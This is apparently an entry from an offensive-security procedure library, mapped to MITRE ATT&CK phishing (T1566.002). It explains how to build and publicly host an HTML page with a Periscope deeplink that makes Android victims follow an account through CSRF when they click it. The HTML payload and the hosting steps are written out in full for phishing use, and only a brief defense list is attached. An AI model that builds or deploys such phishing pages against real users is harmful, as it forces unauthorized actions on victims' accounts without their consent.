---
tags:
  - csrf
  - html
  - phishing
  - android
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Android
submitted: true
created_at: '2024-10-01'
techniques:
  - '[[T1566.002]]'
updated_at: '2025-12-14T17:27:57.885Z'
skill_level: beginner
impact_level: low
detection_risk: medium
sub_techniques: []
id: ab93c8d6-2ccb-46ca-9a8e-6eb0df007df9
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[T1566.002]]'
---
# Create-HTML-Page-with-Embedded-Deeplink

## Summary

This procedure generates a simple HTML page containing a hyperlink to the malicious deeplink, which, when clicked from an Android browser, opens the Periscope app and executes the CSRF follow action.

## Description

The HTML embeds the deeplink in an <a> tag, leveraging the browser's intent handover to the app. Host the page on a public server (e.g., GitHub Pages or ngrok) to share via phishing. This bypasses web protections since the action occurs in the app. Expected outcome: A deployable page that triggers the exploit upon interaction.

## Requirements

1. Constructed deeplink from prior step
2. Web hosting service or local server for testing
3. Basic HTML knowledge

## Defense

Defensive measures and detection strategies:

- Browser extensions to warn on custom scheme links (e.g., uBlock Origin rules)
- App sandboxing to prevent unauthorized intent handling
- Network monitoring for suspicious HTML hosts linking to app schemes

## Objectives

1. Embed deeplink in clickable HTML element
2. Host page for victim access
3. Ensure seamless browser-to-app transition

## Instructions

### Step 1: Write HTML Content

**Context**: Create the basic page with the malicious link.

Use a text editor to build:

```html
<!DOCTYPE html>
<html>
<body>
<a href="pscp://user/<user-id>/follow">CSRF DEMO</a>
</body>
</html>
```

> Replace <user-id> with actual value. Save as index.html.

### Step 2: Host the Page

**Context**: Make the HTML accessible via URL.

Upload to a web host or use a tunneling tool.

> Example: Serve locally with Python `python -m http.server 8000`, access via http://localhost:8000. For remote, use ngrok or similar to get public URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[T1566.002]]

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- csrf
- html
- phishing
- android
